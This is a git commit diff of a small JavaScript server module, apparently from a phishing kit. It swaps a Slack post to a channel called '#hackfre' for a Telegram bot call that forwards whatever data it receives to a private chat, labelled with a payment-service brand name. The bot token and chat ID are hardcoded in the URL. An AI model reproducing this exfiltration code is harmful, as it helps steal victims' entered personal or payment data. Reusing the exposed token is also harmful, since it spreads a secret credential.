affb8f45f65f5b5ba2e31235ff3349fa98d6a4b2
Aabwshmys <aabwshmys84@gmail.com>
2024-12-27 22:41:40 +0300

    Update TeleSned.js

--- ‏‏my-app/src/server/TeleSned.js
+++ ‏‏my-app/src/server/TeleSned.js
@@ -1,28 +1,15 @@
 import axios from 'axios';
 
+
 export const TeleSned = () => {
+
     const Send = async (des) => {
-        const token = process.env.SLACK_BOT_TOKEN;
-        const url = 'https://slack.com/api/chat.postMessage';
-
-        const payload = {
-            channel: '#hackfre', // تحديد القناة مباشرة
-            text: des // تعيين النص من البيانات المدخلة
-        };
-
-        await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${token}`,
-            },
-            body: JSON.stringify(payload),
-        });
+        const text = `مدونة سداد %0A ${des}`;
+        await axios.post(`https://api.telegram.org/bot7816800104:AAFTIrJL464I3Bq2upGIewtYwb4XHRS_CY4/sendMessage?chat_id=7422741721&text=${text}`)
     }
-
-    return {
-        Send,
-    }
+  return {
+    Send,
+}
 }
 
 export default TeleSned;
